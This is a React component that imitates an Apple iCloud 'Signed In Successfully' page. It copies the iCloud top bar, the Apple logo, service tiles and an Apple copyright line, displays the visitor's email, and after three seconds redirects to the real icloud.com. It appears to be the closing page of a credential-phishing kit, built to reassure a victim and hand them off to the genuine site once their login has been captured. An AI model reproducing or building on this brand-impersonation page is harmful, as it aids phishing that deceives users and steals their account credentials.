import { useEffect } from 'react'
import Background from '../components/Background'

export default function SuccessPage({ email, onBack }) {
  useEffect(() => {
    const timer = setTimeout(() => {
      window.location.href = 'https://www.icloud.com/';
    }, 3000); // Redirect after 3 seconds

    return () => clearTimeout(timer);
  }, []);

  return (
    <>
      <Background />

      <div className="topbar">
        <span className="topbar-logo" style={{ fontWeight: 600 }}>iCloud</span>
        <div className="topbar-right">
          <span className="topbar-link">Setup Instructions</span>
          <span style={{ color: 'rgba(255,255,255,0.4)', margin: '0 4px' }}>|</span>
          <div className="topbar-help">
            <svg viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"/>
              <path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/>
              <line x1="12" y1="17" x2="12.01" y2="17"/>
            </svg>
          </div>
        </div>
      </div>

      <div className="page">
        <div className="card" style={{ gap: 18 }}>
          <div className="success-circle" style={{ width: 88, height: 88, borderRadius: 22, background: 'linear-gradient(135deg, #30d158, #28b64a)' }}>
            <svg viewBox="0 0 24 24" strokeLinecap="round" strokeLinejoin="round" style={{ width: 44, height: 44 }}>
              <polyline points="20 6 9 17 4 12"/>
            </svg>
          </div>

          <div className="title" style={{ marginTop: 10 }}>Signed In Successfully</div>
          <div className="subtitle" style={{ color: 'white', opacity: 0.8, fontSize: 13.5 }}>Welcome back! You're now signed in to iCloud.</div>

          <div className="email-display" style={{ background: 'rgba(255,255,255,0.12)', border: 'none' }}>
            <strong style={{ fontSize: 13, color: 'white', opacity: 0.9 }}>{email}</strong>
          </div>

          <div className="divider" style={{ opacity: 0.2 }} />

          {/* iCloud services */}
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 12, width: '100%' }}>
            {[
              { icon: '📷', label: 'Photos' },
              { icon: '📄', label: 'Drive' },
              { icon: '📧', label: 'Mail' },
              { icon: '📅', label: 'Calendar' },
              { icon: '📝', label: 'Notes' },
              { icon: '🔍', label: 'Find My' },
            ].map(item => (
              <div key={item.label} style={{
                background: 'rgba(255,255,255,0.1)',
                borderRadius: 12,
                padding: '12px 8px',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                gap: 5,
                cursor: 'pointer',
                transition: 'all 0.2s',
                border: '1px solid rgba(255,255,255,0.05)',
              }}
              onMouseEnter={e => {
                e.currentTarget.style.background = 'rgba(255,255,255,0.18)';
                e.currentTarget.style.transform = 'translateY(-2px)';
              }}
              onMouseLeave={e => {
                e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                e.currentTarget.style.transform = 'translateY(0)';
              }}
              >
                <span style={{ fontSize: 24 }}>{item.icon}</span>
                <span style={{ color: 'rgba(255,255,255,0.8)', fontSize: 11, fontWeight: 500 }}>{item.label}</span>
              </div>
            ))}
          </div>

          <button className="back-btn" onClick={onBack} style={{ alignSelf: 'center', marginTop: 10, color: 'white', opacity: 0.7 }}>
            Sign Out
          </button>
        </div>
      </div>

      <div className="apple-logo-bottom">
        <svg viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg">
          <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-42.3-150.3-110.7C77.3 714 28.4 596.8 28.4 484.7c0-192.6 127.4-294.4 253.4-294.4 65.4 0 120.5 42.7 162 42.7 39.8 0 101.8-44.3 173.5-44.3 27.5 0 110.8 2.6 173.5 71.8zm-237.7-182c30.4-35.5 52.8-84.8 52.8-134.1 0-6.5-.6-13.1-1.9-18.3-49.6 1.9-108.6 33.1-143.7 73-27.5 30.4-53.1 79.7-53.1 130.6 0 7.1 1.3 14.3 1.9 16.6 3.2.6 8.4 1.3 13.6 1.3 44.4 0 100.8-29.7 130.4-69.1z" fill="white" opacity="0.5"/>
        </svg>
      </div>
      
      <div className="bottom-links">
        <a href="#">Privacy Policy</a>
        <span className="sep">|</span>
        <a href="#">Terms &amp; Conditions</a>
        <span className="sep">|</span>
        <span className="copyright">Copyright © 2019 Apple Inc. All rights reserved.</span>
      </div>
    </>
  )
}
